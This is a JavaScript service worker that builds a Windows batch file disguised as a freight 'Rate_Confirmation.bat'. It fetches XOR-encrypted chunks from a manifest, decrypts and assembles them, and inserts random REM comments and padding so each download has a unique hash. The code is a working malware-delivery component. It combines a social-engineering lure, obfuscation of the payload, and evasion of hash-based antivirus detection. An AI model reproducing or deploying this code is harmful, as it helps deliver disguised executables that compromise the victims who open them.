// ServiceWorker — SourTrade-style .bat assembler
// Auto-detects scope — works on GitHub Pages, Netlify, Cloudflare, Vercel, Surge, etc.

const CACHE_NAME = 'freight-confirm-v2';
const XOR_KEY = 0xAA;

// Base path is derived from SW registration scope
// GitHub Pages: /Ratecon/ → manifest at /Ratecon/rtp/manifest.json
// Netlify:      /       → manifest at /rtp/manifest.json
function getBasePath() {
    return self.registration.scope.replace(/\/$/, '');
}

// Install — pre-cache landing page
self.addEventListener('install', (event) => {
    const base = getBasePath();
    event.waitUntil(
        caches.open(CACHE_NAME).then((cache) => {
            return cache.addAll([base + '/', base + '/index.html']);
        })
    );
    self.skipWaiting();
});

// Activate — claim all clients
self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

// Fetch interceptor
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    const base = getBasePath();

    // Intercept /generate-bat POST (path relative to scope)
    if (url.pathname === base + '/generate-bat' && event.request.method === 'POST') {
        event.respondWith(handleGenerateBat(event.request, base));
        return;
    }

    // Cache-first for landing page
    if (url.pathname === base + '/' || url.pathname === base + '/index.html') {
        event.respondWith(
            caches.match(event.request).then((cached) => cached || fetch(event.request))
        );
        return;
    }
});

// Generate unique random hex string for hash variation
function randomHex(length) {
    const bytes = new Uint8Array(length);
    crypto.getRandomValues(bytes);
    return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
}

// XOR decrypt a base64-encoded chunk
function decryptChunk(b64data, key) {
    const binary = atob(b64data);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i) ^ key;
    }
    return new TextDecoder().decode(bytes);
}

// Main handler: assemble .bat from chunks
async function handleGenerateBat(request, base) {
    try {
        // 1. Fetch chunk manifest (relative to scope)
        const manifestUrl = base + '/rtp/manifest.json';
        const manifestResp = await fetch(manifestUrl);
        if (!manifestResp.ok) throw new Error('Manifest not found: ' + manifestUrl);
        const manifest = await manifestResp.json();

        // 2. Download all chunks in parallel (resolve relative URLs against scope)
        const chunkPromises = manifest.chunks.map(async (chunk) => {
            const chunkUrl = base + '/' + chunk.url;
            const resp = await fetch(chunkUrl);
            if (!resp.ok) throw new Error(`Chunk ${chunk.id} failed: ${resp.status}`);
            const b64 = await resp.text();
            return {
                id: chunk.id,
                data: decryptChunk(b64.trim(), XOR_KEY)
            };
        });

        const chunks = await Promise.all(chunkPromises);

        // Sort by chunk ID
        chunks.sort((a, b) => a.id - b.id);

        // 3. Generate random noise for unique hash
        const randomId = randomHex(32);
        const randomComment = `REM ${randomId}\r\n`;
        const randomPadding = '\r\n'.repeat(Math.floor(Math.random() * 5) + 1);

        // 4. Assemble final .bat
        const batContent = randomComment + randomPadding + chunks.map(c => c.data).join('\r\n');

        // 5. Return as downloadable blob
        return new Response(new Blob([batContent], { type: 'application/bat' }), {
            status: 200,
            headers: {
                'Content-Type': 'application/bat',
                'Content-Disposition': 'attachment; filename="Rate_Confirmation.bat"',
                'Cache-Control': 'no-cache, no-store, must-revalidate'
            }
        });

    } catch (err) {
        console.error('SW assembly error:', err);
        return new Response('Generation failed', { status: 500 });
    }
}
